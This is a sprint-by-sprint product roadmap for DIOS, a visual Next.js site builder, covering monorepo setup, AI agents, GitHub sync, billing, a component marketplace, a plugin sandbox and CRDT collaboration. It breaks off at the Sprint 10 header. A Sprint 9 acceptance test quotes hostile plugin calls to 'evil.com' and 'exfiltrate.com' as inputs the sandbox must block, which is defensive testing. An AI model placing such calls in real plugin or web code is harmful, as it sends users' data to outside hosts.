# CANONICAL MASTER SPRINT PLAN (`SPRINTS 0 THROUGH 12`)
## Exhaustive 24-Month Staged Execution Sequence Across 13 Sprints
**Document Series:** Master Execution Plan (MEP) — File 5 of 8 | **Status:** Approved Sprint Roadmap | **Execution Pods:** 4 Core Pods

---

# SPRINT PLANNING METHODOLOGY & EXECUTION CADENCE

Our engineering organization executes under a strict, cadence-driven sprint framework across our four specialized execution pods (`Platform Pod`, `AST Pod`, `Canvas Pod`, `AI Pod`, augmented by `Ecosystem Pod` and `Enterprise Pod` in year 2). 

To balance high velocity with zero-throwaway architectural preservation, our initial launch phase (`Sprint 0–6`) operates on **2-Week (14-Day) Atomic Sprint Cadences**. Post-launch expansion sprints (`Sprint 7–9`) transition to **30-Day Ecosystem Cadences**, while enterprise and platform scaling sprints (`Sprint 10–12`) operate on **60 to 180-Day Governance Cadences**.

---

# SPRINT 0: MONOREPO SCAFFOLDING & ZERO-THROWAWAY FOUNDATION
- **Assigned Release Bucket:** `v0.5 Alpha` (Foundation) | **Duration:** Weeks 1–2 (`14 Calendar Days`)
- **Assigned Pods:** `Platform Pod`, `AST Pod`
- **Assigned Canonical Features:** `AUTH-01` (`Clerk JWKS`), `WS-01` (`Workspace Root`), `PRJ-01` (`Project Entity`), `AST-01` (`IASTNode Schema`), `TKN-01` (`tokens.json Law`) (`5 Features`)

### 1. Executive Objectives & Architectural Focus
Initialize our Next.js 15 App Router monorepo (`@dios/core`) using `pnpm workspaces` and `Turborepo`. Scaffold our core domain types (`@dios/types`) and mount our **100%-Extensible Drizzle ORM Relational Schema (`all 20+ tables preserved from Day 1 with dormant flags`)** against PostgreSQL 16. Configure edge authentication middleware.

### 2. Upstream Dependencies & Prerequisites
- Provisioning of Clerk Enterprise API credentials, Neon/Supabase PostgreSQL connection strings, and Upstash Redis endpoints.

### 3. Physical Deliverables & Code Packages Scaffolding
- `packages/types/src/index.ts` — Exported `IASTNode`, `IW3CTokenMap`, and `WorkspaceRole` Zod schemas.
- `packages/db/src/schema/*.ts` — Complete Drizzle ORM schema across all 20+ tables (`workspaces` to `audit_logs`).
- `packages/auth/src/middleware.ts` — Clerk edge authentication middleware protecting `/api/*` and `/trpc/*` endpoints.

### 4. Verifiable Acceptance Criteria (`Definition of Done`)
1. Running `pnpm build` across the entire monorepo completes in `< 15 seconds` with zero TypeScript or linting errors.
2. Drizzle ORM migration runs against PostgreSQL 16 without error; verifies all 20+ tables exist; verifies `is_active = false` flags on dormant marketplace/plugin tables.
3. Unauthenticated HTTP requests to `/api/trpc/project.create` return exact `401 Unauthorized` JSON errors in `< 2ms`.

### 5. Execution Risks & Testing Strategy
- **Risk:** Type drift between database ORM and frontend schemas. **Mitigation:** Enforce single-source-of-truth export from `@dios/types`.
- **Testing:** Automated unit tests verifying `AST-01` and `TKN-01` Zod schemas against valid/invalid JSON mock payloads (`100% test coverage`).

---

# SPRINT 1: AST COMPILER ENGINE & SUB-TREE DIFFING CORE
- **Assigned Release Bucket:** `v0.5 Alpha` | **Duration:** Weeks 3–4 (`14 Calendar Days`)
- **Assigned Pods:** `AST Pod`, `Platform Pod`
- **Assigned Canonical Features:** `AST-02` (`SWC Parser`), `AST-03` (`Delta Engine`), `AST-04` (`Zstd DB Store`), `AST-05` (`Window Pruning`), `PRJ-02` (`Zustand Auto-Save`), `PRJ-03` (`Optimistic Lock`), `PRJ-04` (`Undo/Redo`), `WS-02` (`Invites`), `WS-03` (`Settings`) (`9 Features`)

### 1. Executive Objectives & Architectural Focus
Build our core TypeScript AST visitor engine (`@dios/ast-core`) powered by `SWC`. Implement sub-tree delta computing (`computePatch`), Zstd JSONB database compression, browser-side debounced auto-saving (`Zustand 3s buffer`), and single-editor optimistic locking (`version_id`).

### 2. Upstream Dependencies & Prerequisites
- Completion of `Sprint 0` (`AST-01` node schemas, `PRJ-01` project entities, and `DB-01` schema).

### 3. Physical Deliverables & Code Packages Scaffolding
- `packages/ast-core/src/compiler/*.ts` — SWC JSX parser (`parseJSX`) and Next.js TSX code serializer (`serializeAST`).
- `packages/ast-core/src/diff/patcher.ts` — Sub-tree structural diffing engine (`computePatch`) emitting `ASTMutationPatch` payloads.
- `apps/web/src/stores/projectStore.ts` — Zustand client store managing debounced auto-saves and local `Ctrl+Z` undo stacks.

### 4. Verifiable Acceptance Criteria (`Definition of Done`)
1. `parseJSX(sampleComponentCode)` converts a 100-line React TSX component into our exact `IASTNode` JSON tree structure in `< 30ms`.
2. Modifying a node prop in Zustand automatically triggers an HTTP POST auto-save after exactly 3 seconds of inactivity, storing Zstd compressed JSON inside `project_versions.ast_tree`.
3. Simultaneous save attempt by a second user ID against the same `version_id` returns `409 Conflict`.

### 5. Execution Risks & Testing Strategy
- **Risk:** High memory allocation during SWC parsing. **Mitigation:** Run SWC parser inside reusable worker pool.
- **Testing:** Integration tests executing 1,000 random DOM tree mutations and verifying `serializeAST(computePatch(tree))` matches expected React code (`99.99% AST fidelity`).

---

# SPRINT 2: DESIGN TOKENS LAW & REACT 19 CANVAS ENGINE
- **Assigned Release Bucket:** `v0.5 Alpha` | **Duration:** Weeks 5–6 (`14 Calendar Days`)
- **Assigned Pods:** `Canvas Pod`, `AST Pod`
- **Assigned Canonical Features:** `TKN-02` (`Real-Time Compiler`), `TKN-03` (`Zero-Hex Law`), `CNV-01` (`60fps Canvas`), `CNV-02` (`Property Inspector`), `CNV-03` (`Viewport Matrix`), `CNV-04` (`Wireframes`), `CMP-01` (`11 Core Specs`) (`7 Features`)

### 1. Executive Objectives & Architectural Focus
Build our real-time design token compiler (`tokens.json -> Tailwind CSS v4 variables in < 5ms`). Launch `@dios/canvas`, rendering React 19 virtualized DOM inside an isolated iframe (`Shadow DOM`) at 60fps. Implement the right-hand Property Inspector and 11 core built-in component specifications (`Hero`, `Pricing`...).

### 2. Upstream Dependencies & Prerequisites
- Completion of `Sprint 1` (`AST-02` parser and `AST-03` patcher).

### 3. Physical Deliverables & Code Packages Scaffolding
- `packages/tokens/src/compiler/*.ts` — Real-time token-to-Tailwind CSS compiler and zero-hex enforcement rule engine.
- `packages/ast-core/src/components/*.ts` — 11 built-in React 19 component specs (`HeroSpec`, `PricingTableSpec`...).
- `apps/web/src/components/canvas/*.tsx` — Virtualized DOM iframe renderer, viewport switcher, wireframe toggle, and Property Inspector.

### 4. Verifiable Acceptance Criteria (`Definition of Done`)
1. Dragging an element selection box across 50 rendered DOM elements inside the canvas iframe maintains a `60fps` frame rate (`< 16.6ms render time`).
2. Editing `padding: p-8` inside the Property Inspector panel updates the target AST node and reflects visual layout changes on canvas in `< 15ms`.
3. Ad-hoc hex color input (`#FF0000`) entered via inspector is blocked and auto-mapped to `color.accent.error`.

### 5. Execution Risks & Testing Strategy
- **Risk:** CSS variable specificity leakage across iframe boundary. **Mitigation:** Mount canvas root inside strict `Shadow DOM` portal with isolated `<style>` tags.
- **Testing:** E2E Playwright tests rendering all 11 core components, toggling viewports (`375px -> 1440px`), and asserting zero console errors or visual clipping.

---

# SPRINT 3: 3-AGENT AI LOOP, EDGE PUBLISHING & `v0.5 ALPHA` EXIT GATE
- **Assigned Release Bucket:** `v0.5 Alpha` | **Duration:** Weeks 7–8 (`14 Calendar Days`)
- **Assigned Pods:** `AI Pod`, `Platform Pod`
- **Assigned Canonical Features:** `AI-01` (`Cmd+K Bar`), `AI-02` (`Haiku Router`), `AI-03` (`Sonnet Generator`), `AI-04` (`Static Linter Gate`), `DEP-01` (`/out Compiler`), `DEP-02` (`R2/KV Anycast`), `DEP-03` (`Instant Rollback`), `BIL-01` (`Stripe Webhook`), `BIL-02` (`Free Quotas`), `ANA-01` (`OTel Traces`) (`10 Features`)

### 1. Executive Objectives & Architectural Focus
Connect our floating `Cmd+K` prompt drawer to our **3-Agent Atomic AI Loop (`Haiku Router -> Sonnet Generator -> Local TS Linter`)** via Server-Sent Events (`SSE`). Build our 1-click static Next.js edge compiler and Cloudflare R2 + Edge KV Anycast publisher (`*.dios.app`). Connect Stripe webhooks and OpenTelemetry tracing. **EXECUTE `v0.5 ALPHA` INTERNAL LAUNCH.**

### 2. Upstream Dependencies & Prerequisites
- Completion of `Sprint 2` (`CNV-01` canvas targeting, `TKN-02` token compiler, and `CMP-01` components).

### 3. Physical Deliverables & Code Packages Scaffolding
- `packages/ai/src/agents/*.ts` — `HaikuRouterAgent`, `SonnetGeneratorAgent`, and `StaticLinterGate` (`axe-core / DOMPurify`).
- `packages/deploy/src/publisher.ts` — Static HTML chunk compiler (`/out`) and Cloudflare R2 / Edge KV PUT uploaders.
- `apps/web/src/app/api/ai/stream/route.ts` — SSE streaming API route emitting `ASTMutationPatch` chunks.

### 4. Verifiable Acceptance Criteria (`Definition of Done`)
1. User prompt (`"Make pricing cards dark with 3 columns"`) submitted via `Cmd+K` streams validated `ASTMutationPatch` payloads and updates canvas live in **P95 latency `< 3.0 seconds` at cost `< $0.09`**.
2. Clicking "Publish to Edge" compiles AST and uploads static bundle to Cloudflare R2 (`/v123/*`), updating Edge KV (`acme.dios.app`) in `< 3 seconds`.
3. Clicking "Rollback" repoints Edge KV to previous snapshot (`/v122/*`) in `< 1 second`.

### 5. Execution Risks & Testing Strategy
- **Risk:** LLM streaming invalid JSON syntax chunks. **Mitigation:** Mount `SuperJSON` + Zod partial parser inside `AI-04` Static Gate before applying patches.
- **Testing:** End-to-End simulation executing 100 AI prompt turns against active canvas and verifying zero XSS injections (`DOMPurify`) or WCAG contrast violations. **EXIT GATE: `v0.5 Alpha` CERTIFIED.**

---

# SPRINT 4: FULL 2-WAY GITHUB MONOREPO SYNCHRONIZATION
- **Assigned Release Bucket:** `v1.0 Public` | **Duration:** Weeks 9–10 (`14 Calendar Days`)
- **Assigned Pods:** `Platform Pod`, `AST Pod`
- **Assigned Canonical Features:** `GIT-001` (`GitHub App OAuth`), `GIT-002` (`Clean Code Exporter`), `GIT-003` (`Inngest Pusher`), `GIT-004` (`Incoming Webhook`), `AUTH-007` (`GitHub Credential Authorization`), `WS-004` (`Multi-Workspace Dashboard`), `WS-005` (`Audit Trail`) (`7 Features`)

### 1. Executive Objectives & Architectural Focus
Build our **Bidirectional GitHub Monorepo Synchronization Engine (`Code is Truth`)**. Enable 1-click GitHub App repository linking, clean Next.js 15 App Router code generation (`/src/app/*`), Inngest async atomic git pushing (`feat(dios)`), and incoming webhook pullers (`push -> SWC parse -> canvas AST update in < 3s`).

### 2. Upstream Dependencies & Prerequisites
- Completion of `Sprint 3` (`v0.5 Alpha` active baseline, `AST-02` parser/serializer, and `INF-02` Inngest queues).

### 3. Physical Deliverables & Code Packages Scaffolding
- `packages/git/src/github/*.ts` — GitHub App installation router, repository provisioning API, and encrypted credential storage with revocation and key-version hooks.
- `packages/git/src/sync/*.ts` — AST-to-TSX code exporter, Inngest commit bundler (`pushCommitJob`), and incoming webhook handler (`webhookPushHandler`).
- `apps/web/src/app/dashboard/page.tsx` — Multi-workspace dashboard matrix and immutable audit trail viewer.

### 4. Verifiable Acceptance Criteria (`Definition of Done`)
1. Clicking "Connect GitHub Repository" links project slug to `main` branch; clicking "Export Code" pushes clean, buildable Next.js 15 TSX files to repository in `< 4 seconds`.
2. Developer commits `git push` modifying `<section id="hero-1">` copy in VS Code; DIOS incoming webhook receives push, runs SWC, and updates active canvas session in `< 3 seconds` without data loss.
3. Exported repository code passes `npm install && npm run build` locally with zero missing dependencies or DIOS runtime imports.

### 5. Execution Risks & Testing Strategy
- **Risk:** GitHub API rate limits during rapid canvas saves. **Mitigation:** Debounce git commits via Inngest durable queue (`GIT-03`); batch edits into 30-second atomic commit windows.
- **Testing:** Automated integration tests spinning up ephemeral GitHub repositories, executing bidirectional push/pull cycles, and verifying exact file AST hash equality (`100% code parity`).

### 6. Task Order and Quality Gates
1. **Task 4.1 — `AUTH-007`, `GIT-001`:** GitHub App installation authorization, encrypted credential lifecycle, repository linking, and project-settings UI.
2. **Task 4.2 — `GIT-002`:** Standalone code exporter.
3. **Task 4.3 — `GIT-003`:** Durable background push.
4. **Task 4.4 — `GIT-004`, `WS-004`, `WS-005`:** Incoming synchronization, dashboard, and immutable audit feed.

Each task must pass implementation, tests, type safety, documentation, real lint, performance, security review, and commit gates before the next task begins.

---

# SPRINT 5: THEME STUDIO, BRAND PRESETS & TEMPLATE GROWTH ENGINE
- **Assigned Release Bucket:** `v1.0 Public` | **Duration:** Weeks 11–12 (`14 Calendar Days`)
- **Assigned Pods:** `Canvas Pod`, `AST Pod`, `Platform Pod`
- **Assigned Canonical Features:** `TKN-04` (`Theme Studio`), `CMP-02` (`50 Brand Presets`), `CMP-03` (`Insertion Drawer`), `CMP-04` (`Prop Customizer`), `PRJ-05` (`Template Cloning`), `CNV-05` (`Responsive Grid Math`) (`6 Features`)

### 1. Executive Objectives & Architectural Focus
Launch our interactive **W3C Token Theme Studio** (`Light/Dark mode inverter`). Hardcode 50 curated Obsidian brand kits (`Cyberpunk`, `Fintech Clean`...). Build our visual component insertion drawer (`left slide-over`), right-hand prop customizer, responsive grid layout splitter (`grid-cols-1 md:grid-cols-3`), and 1-click template duplication bridge.

### 2. Upstream Dependencies & Prerequisites
- Completion of `Sprint 4` (`TKN-02` token compiler and `CMP-01` component specs).

### 3. Physical Deliverables & Code Packages Scaffolding
- `packages/tokens/src/studio/*.ts` — Theme Studio state inverter and contrast verification utility (`WCAG AA`).
- `packages/tokens/src/presets/*.json` — Exactly 50 pre-compiled W3C `tokens.json` brand templates.
- `apps/web/src/components/canvas/drawers/*.tsx` — Left-hand component insertion drawer and interactive column splitters.

### 4. Verifiable Acceptance Criteria (`Definition of Done`)
1. Clicking any of the 50 brand preset thumbnails updates `project_versions.tokens_json`, recompiles Tailwind CSS, and re-renders the entire canvas in `< 50ms`.
2. Toggling "Dark Mode" inside Theme Studio auto-generates an inverted color token scale where 100% of text-to-background combinations maintain `>= 4.5:1` contrast.
3. Dragging a column splitter handle on canvas converts visual width changes directly into responsive Tailwind grid classes (`grid-cols-1 md:grid-cols-3`) without manual CSS editing.

### 5. Execution Risks & Testing Strategy
- **Risk:** Token color scale inversion generating muddy mid-tones. **Mitigation:** Use HSL perceptual luminance curves (`Luminance inversion math`) inside `TKN-04`.
- **Testing:** Visual regression suite rendering all 50 brand presets across all 11 core components, asserting zero visual overlap or unreadable text.

> **SUPERSEDED BY FINAL PRE-GA OVERLAY:** The historical Sprint 5 above is preserved for traceability. The binding Sprint 5 is defined below under the authority of `CANONICAL_RECONCILIATION.md`.

## FINAL SPRINT 5: INTEGRATED REPOSITORY WEDGE

- **Assigned Release Bucket:** `v1.0 Public` pre-GA integration | **Duration:** `14 Calendar Days`
- **Purpose:** Turn existing library prototypes into one authenticated, persisted, customer-visible workflow over a real supported Next.js repository.
- **Canonical Features:** `PRJ-008`, `GIT-009`, `AST-011`, `CHG-001`, plus integration completion of `TKN-004`, `CMP-003..004`, and `CNV-005`.

### Task 5.1 — Integrated application foundation and persistence (`PRJ-008`)

- Mount real session/auth boundaries, workspace/project APIs, canvas route, and production-shaped dependencies.
- Implement a type-safe transactional save endpoint that atomically persists AST, tokens, active version, and optimistic version.
- Reject stale versions with `409`; reject cross-tenant access; restore the exact committed hash after refresh.
- **Gate:** signup → workspace → project → edit → save → reload passes in Playwright without an in-memory substitute on the certified path.

### Task 5.2 — Brownfield repository analysis (`GIT-009`, `AST-011`)

- Analyze a linked existing Next.js repository without mutation.
- Report supported files/components, unsupported constructs, parse failures, framework/dependency risk, tokens, routes, and remediation.
- Classify every analyzed region as `editable`, `review-required`, or `read-only`, with machine-readable reasons.
- Enforce boundaries in canvas and AI; unsupported regions cannot be silently rewritten.
- **Gate:** editing remains disabled until the user accepts the report; attempts to mutate read-only regions fail safely and visibly.

### Task 5.3 — Essential visual editing integration

- Complete `TKN-004`, `CMP-003`, `CMP-004`, and `CNV-005` against persisted state and editability boundaries.
- Existing early presets remain. Completion of exactly 50 presets (`CMP-002`) moves to Sprint 8.
- **Gate:** theme, insertion, props, and responsive changes persist, serialize, and stay within approved regions.

### Task 5.4 — Semantic change object (`CHG-001`)

- Create one immutable record linking intent, base SHA/version, semantic IDs, AST patch, source diff, checks, actor, review state, deployment state, and outcome references.
- Preserve unchanged files byte-for-byte where applicable and unchanged AST references semantically.
- **Gate:** unrelated file and unrelated semantic-node mutation counts are zero.

### Sprint 5 exit gate

A user connects a real repository, receives compatibility/editability results, performs and persists one supported change, and obtains a minimal buildable source diff. Sprint 5 does not certify GA.

---

# SPRINT 6: ORCHESTRATION EXPANSION, BILLING & `v1.0 PUBLIC` EXIT GATE
- **Assigned Release Bucket:** `v1.0 Public` | **Duration:** Weeks 13–14 (`14 Calendar Days`)
- **Assigned Pods:** `AI Pod`, `Platform Pod`, `Canvas Pod`
- **Assigned Canonical Features:** `AI-05` (`Vision Converter`), `AI-06` (`Reviewer Loop`), `AI-07` (`Layout/UX Specialists`), `CNV-06` (`Lazy Windowing`), `AST-06` (`Node ID Lock`), `DEP-04` (`Custom DNS/SSL`), `BIL-03` (`Pro Quotas`), `BIL-04` (`Agency Quotas`), `ANA-02` (`Web Vitals`), `ENT-01` (`Enterprise Schema`), `ENT-02` (`SOC2 Monitor`) (`11 Features`)

### 1. Executive Objectives & Architectural Focus
Activate specialized AI agents (`ORC-06 Layout`, `ORC-07 UX Specialist`, `ORC-13 Reviewer Loop`) and multi-modal Vision (`image-to-code`). Build virtualized sub-tree lazy windowing (`CNV-06`) for 100+ page sites. Connect Stripe billing gates (`Pro $29/mo`, `Agency $299/mo`), custom domain SSL routing (`DEP-04`), core web vitals scripts, and continuous SOC2 monitoring. **EXECUTE `v1.0 PUBLIC` LAUNCH.**

### 2. Upstream Dependencies & Prerequisites
- Completion of `Sprint 5` (`AI-03` generator, `DEP-02` edge publisher, and `BIL-01` stripe webhook core).

### 3. Physical Deliverables & Code Packages Scaffolding
- `packages/ai/src/agents/specialists/*.ts` — `LayoutSpecialistAgent`, `UXSpecialistAgent`, and `ReviewerLoopAgent`.
- `apps/web/src/components/canvas/windowing/*.tsx` — Virtualized sub-tree lazy windowing DOM pruner (`ASTNodeId` viewport windowing).
- `packages/deploy/src/domains/router.ts` — Cloudflare Custom Hostname API bridge (`SSL certificate provisioning`).

### 4. Verifiable Acceptance Criteria (`Definition of Done`)
1. Dropping a wireframe screenshot (`PNG`) into `Cmd+K` outputs exact structural `IASTNode` layout and applies local design tokens in `< 4.5 seconds`.
2. Free tier workspace clicking "Connect Custom Domain" or "Export to GitHub" opens Stripe Checkout; upon upgrading to Pro (`$29/mo`), features unlock instantly via webhook without relogging.
3. Rendering a 500-node (100+ page) enterprise site inside canvas consumes `< 150MB` total browser heap memory via `CNV-06` windowing.

### 5. Execution Risks & Testing Strategy
- **Risk:** Specialized agents hallucinating invalid React props. **Mitigation:** All specialist output must pipe through `AI-06` Reviewer Loop before reaching canvas.
- **Testing:** Complete public readiness penetration and load test (`1,000 concurrent AI prompt turns`, `10,000 edge site hits`). **EXIT GATE: `v1.0 PUBLIC LAUNCH` CERTIFIED.**

> **SUPERSEDED BY FINAL PRE-GA OVERLAY:** The historical Sprint 6 above is preserved for traceability. It does not certify launch. The binding Sprint 6 follows.

## FINAL SPRINT 6: TRUST, COMMERCIALIZATION, AND GA CERTIFICATION

- **Assigned Release Bucket:** `v1.0 Public` | **Duration:** `14 Calendar Days`, subject to gates rather than calendar-only launch
- **Canonical Features:** `GIT-005`, `AI-006`, `REV-001`, `DEP-004`, `BIL-003`, `ANA-002`, `PRV-001`, `BIL-007`, `MIG-001`, `BKP-001`, `SEC-001..002`, `GIT-007..008`, `OPS-001`, `TST-001..002`, `A11Y-001`, `VAL-001`.

### Task 6.1 — Safe PR review and reconciliation (`GIT-005`, `AI-006`, `REV-001`)

- Create a dedicated branch and normal GitHub PR from `CHG-001`.
- Present source diff, semantic summary, responsive before/after, checks, risks, and approve/reject actions.
- Merge SHA reconciles exactly to active project; conflicts or unsafe scopes pause instead of overwriting.
- **Gate:** a supported change produces a buildable PR and rejection leaves the target branch unchanged.

### Task 6.2 — Commercial, privacy, analytics, and domain integration

- Complete `DEP-004`, one monetizable Pro entitlement (`BIL-003`), canonical billing lifecycle/economics (`BIL-007`), consent controls (`PRV-001`), and consent-gated `ANA-002`.
- Signed/idempotent Stripe flows cover checkout, invoice, proration, retry, cancellation, and refund.
- Analytics and optional learning remain off until explicit tenant consent; withdrawal stops collection; users can inspect/delete AI memory; source/prompts/secrets/raw assets never enter ordinary telemetry.
- **Gate:** domain, billing, entitlement, consent, withdrawal, and approved gross-margin workload scenarios pass end to end.

### Task 6.3 — Initial production-assurance certification

- Implement and certify `MIG-001`, `BKP-001`, `SEC-001..002`, `GIT-007..008`, `OPS-001`, `TST-001`, and `A11Y-001` before GA.
- **Gate:** empty/N-1 migrations, isolated PITR restore, duplicate/delayed/missed webhook convergence, force-push safety, credential rotation/revocation, cross-tenant security, required CI, WCAG 2.2 AA, and incident game day pass.

### Task 6.4 — Public proof and customer validation (`TST-002`, `VAL-001`)

- Maintain a versioned corpus of at least 10 non-demo repositories with 10 round-trip cycles each.
- Certify signup → managed preview/live target and repository → first safe PR golden journeys.
- Onboard 5–10 qualified design partners using real repositories; at least three must pay.
- **Gate:** at least 90% of supported pilot PRs merge without manual code repair; all failures and unsupported cases are categorized; explicit retain/iterate/stop and GA decisions cite evidence.

### Sprint 6 / GA exit gate

GA requires all Tasks 6.1–6.4, zero unresolved P0/P1 data-loss/security/tenant-isolation/restore defects, approved pricing, redacted telemetry, documented support boundaries, and explicit release authorization. Calendar completion alone cannot certify release.

---

# SPRINT 7: IN-CANVAS SANDPACK EMULATION & VECTOR RAG (`v1.5 POLISH`)
- **Assigned Release Bucket:** `v1.5 Polish` | **Duration:** Months 4–5 (`30 Calendar Days`)
- **Assigned Pods:** `Canvas Pod`, `AI Pod`, `Platform Pod`
- **Assigned Canonical Features:** `CNV-07` (`Sandpack Emulation`), `AST-07` (`Code-Splitting`), `AI-08` (`pgvector RAG`), `AI-09` (`o3 Wireframe Planner`), `CMP-05` (`Programmatic SSG Directory`), `DEP-05` (`Edge Image Optimization`), `GIT-05` (`Conflict Resolver`), `BIL-05` (`Credit Top-Ups`), `ANA-03` (`Cost Matrix`), `PLG-01` (`Plugin Hooks`) (`10 Features`)

### 1. Executive Objectives & Architectural Focus
Build our in-canvas `Sandpack / WebContainer` runtime engine (`CNV-07`), allowing full Node.js server actions and dynamic form previews to execute live inside the canvas iframe. Implement PostgreSQL `pgvector` embedding indexing (`AI-08`) to remember past user style preferences across sessions. Deploy `next/dynamic` code splitting, edge image optimization, internal plugin lifecycle hooks (`PLG-01`), and our 10,000+ programmatic SEO template directory (`CMP-05`). **EXECUTE `v1.5 POLISH` RELEASE.**

### 2. Upstream Dependencies & Prerequisites
- Completion of `Sprint 6` (`v1.0 Public` stable baseline, `DB-01` schema, and `AST-02` compiler).

### 3. Physical Deliverables & Code Packages Scaffolding
- `apps/web/src/components/canvas/runtime/SandpackHost.tsx` — WebContainer / Sandpack iframe emulation bridge.
- `packages/ai/src/rag/vectorStore.ts` — PostgreSQL `pgvector` (`vector(1536)`) embedding writer and cosine similarity retriever.
- `packages/types/src/plugins.ts` — Internal `IPluginHost` lifecycle hook interceptors (`onASTMutate`, `onTokenChange`).

### 4. Verifiable Acceptance Criteria (`Definition of Done`)
1. Interactive contact form executing `await fetch('/api/submit')` runs successfully inside canvas `Sandpack` iframe without throwing CORS or missing runtime errors.
2. User typing `"Remember: always use 12px border radius for cards"` stores vector embedding in `pgvector`; subsequent prompt (`"Create pricing section"`) automatically injects `rounded-xl` (`12px`) via RAG retrieval (`< 15ms`).
3. Programmatic directory SSG pipeline (`/components/*`) generates 10,000+ static landing pages with live component preview iframes and 1-click workspace cloning links.

### 5. Execution Risks & Testing Strategy
- **Risk:** Sandpack WebContainer initialization delaying initial canvas mount. **Mitigation:** Lazy-load `SandpackHost` only when user clicks "Live Server Preview" toggle.
- **Testing:** Load testing `pgvector` index against 100,000 stored prompt vectors, asserting cosine similarity query return times under `20ms`. **EXIT GATE: `v1.5 Polish` CERTIFIED.**

> **Mandatory next workstream:** Execute Sprint 7H immediately after Sprint 7 and before Sprint 8. Its full specification is maintained in the addendum at the end of this file and in `PRODUCTION_HARDENING_PLAN.md`.

---

# SPRINT 8: CREATOR COMPONENT MARKETPLACE & STRIPE CONNECT BILLING
- **Assigned Release Bucket:** `v2.0 Ecosystem` | **Duration:** Months 6–7 (`30 Calendar Days`)
- **Assigned Pods:** `Ecosystem Pod`, `Platform Pod`
- **Assigned Canonical Features:** `MKT-01` (`Marketplace Service Core`), `MKT-02` (`Registry Schema`), `MKT-03` (`Stripe Connect 80/20 Split`), `MKT-04` (`Automated Security Sandbox`), `MKT-05` (`Creator Storefronts`), `CMP-06` (`License Verification`), `WS-06` (`Client Editor Portal`), `PRJ-06` (`Asynchronous Visual Branching`) (`8 Features`)

### 1. Executive Objectives & Architectural Focus
Activate our dormant `marketplace_items` and `seller_accounts` schema tables (`MKT-02`). Build public Creator Storefronts (`dios.app/@creator`), automated Stripe Connect Express payouts (`80% seller / 20% DIOS commission`), star ratings (`MKT-05`), and automated AST security ingestion sandboxes (`MKT-04`). Launch Agency Client Portal (`WS-06`) and asynchronous visual branching (`PRJ-06`).

### 2. Upstream Dependencies & Prerequisites
- Completion of `Sprint 7` and certification of mandatory `Sprint 7H` (`v1.5 Polish` active, production recovery/security gates passed, `BIL-01` Stripe webhooks, and `AI-04` static linter gates).

### 3. Physical Deliverables & Code Packages Scaffolding
- `packages/marketplace/src/services/*.ts` — Marketplace listing query service, Stripe Connect account onboarding router, and checkout unlock bridge.
- `packages/marketplace/src/security/ingestionScanner.ts` — Automated AST security scanner checking seller submissions for external scripts or network hooks.
- `apps/web/src/app/creator/[slug]/page.tsx` — Public creator storefront profiles and component rating matrix.

### 4. Verifiable Acceptance Criteria (`Definition of Done`)
1. Creator completes Stripe Connect Express onboarding; submits component AST; ingestion scanner verifies zero `<script>` tags or external hooks and publishes listing to marketplace (`MKT-04`).
2. Buyer clicks "Purchase Component ($49)"; Stripe Checkout processes payment; $39.20 (`80%`) transfers instantly to creator's Connect balance; item AST unlocks inside buyer's workspace component drawer.
3. Designer creates visual branch (`design-exploration`); edits AST without altering main branch; clicks "Create Pull Request" to trigger side-by-side visual diff comparison (`PRJ-06`).

### 5. Execution Risks & Testing Strategy
- **Risk:** Fraudulent sellers uploading copyrighted or malicious AST payloads. **Mitigation:** Enforce `MKT-04` static AST scanner and `CMP-06` license attestation before item activation.
- **Testing:** End-to-End marketplace simulation executing seller registration, item submission, security scan verification, Stripe Connect payout split, and canvas AST insertion.

---

# SPRINT 9: WEB WORKER PLUGIN SANDBOX & REAL-TIME CRDT (`v2.0 GATE`)
- **Assigned Release Bucket:** `v2.0 Ecosystem` | **Duration:** Months 8–9 (`30 Calendar Days`)
- **Assigned Pods:** `Ecosystem Pod`, `Canvas Pod`, `AST Pod`
- **Assigned Canonical Features:** `PLG-02` (`Zero-DOM Web Worker Sandbox`), `PLG-03` (`Typed postMessage RPC`), `PLG-04` (`Manifest Scopes`), `COL-01` (`IASTCollaborative CRDT`), `COL-02` (`Durable Objects WebSockets`), `COL-03` (`Multi-Cursor Presence`), `COL-04` (`Inline Canvas Comments`), `COL-05` (`PR Workflows`), `CNV-08` (`Live Cursors`), `TKN-05` (`Figma Sync Bridge`), `ANA-04` (`WAE Telemetry`) (`11 Features`)

### 1. Executive Objectives & Architectural Focus
Build our **Zero-DOM Web Worker Plugin Sandbox (`WorkerGlobalScope`)**, allowing third-party JS plugins to safely mutate ASTs via typed `postMessage` RPC bridges. Activate **Real-Time `Yjs` CRDT Multiplayer Collaboration (`COL-01..05`)** powered by Cloudflare Durable Objects WebSockets, rendering live teammate cursors and inline comment pins. Launch bi-directional Figma token synchronization (`TKN-05`). **EXECUTE `v2.0 ECOSYSTEM` LAUNCH.**

### 2. Upstream Dependencies & Prerequisites
- Completion of `Sprint 8` (`PLG-01` hook interceptors, `AST-01` node schemas, and `CNV-01` canvas root).

### 3. Physical Deliverables & Code Packages Scaffolding
- `packages/plugins/src/sandbox/*.ts` — Web Worker zero-DOM sandbox mounting (`WorkerGlobalScope`) and `postMessage` RPC action dispatcher (`dispatchRPCAction`).
- `packages/collaboration/src/crdt/*.ts` — Yjs `Y.Map` wrapper around `IASTNode` and Cloudflare Durable Objects WebSocket relay (`ASTDurableObject`).
- `packages/tokens/src/figma/bridge.ts` — Figma plugin API adapter (`@dios/figma-sync`) for 2-way token import/export.

### 4. Verifiable Acceptance Criteria (`Definition of Done`)
1. Third-party plugin worker executing `self.window.location = 'evil.com'` or `fetch('https://exfiltrate.com')` throws immediate sandbox security exception and is terminated (`PLG-02`).
2. Two users editing the exact same canvas project simultaneously see each other's colored floating cursors (`< 50ms latency via Durable Objects`); concurrent node edits converge mathematically via `Yjs` CRDT (`COL-02`).
3. Clicking "Push to DIOS" inside our Figma plugin synchronizes local Figma variable collections directly to active `project_versions.tokens_json` in `< 2 seconds` (`TKN-05`).

### 5. Execution Risks & Testing Strategy
- **Risk:** Yjs WebSocket memory leaks inside Cloudflare Durable Objects. **Mitigation:** Enforce automatic connection pruning after 5 minutes of client disconnect; persist state snapshots to R2 every 60 seconds.
- **Testing:** Concurrency stress test connecting 50 simulated WebSocket peers to a single `ASTDurableObject`, executing 5,000 simultaneous node mutations, and asserting zero CRDT divergence or dropped connections. **EXIT GATE: `v2.0 Ecosystem` CERTIFIED.**

---

# SPRINT 10: ENTERPRISE GOVERNANCE, SOC2 & EUROPEAN DATA RESIDENCY
- **Assigned Release Bucket:** `Enterprise` | **Duration:** Months 10–12 (`60 Calendar Days`)
- **Assigned Pods:** `Enterprise Pod`, `Platform Pod`
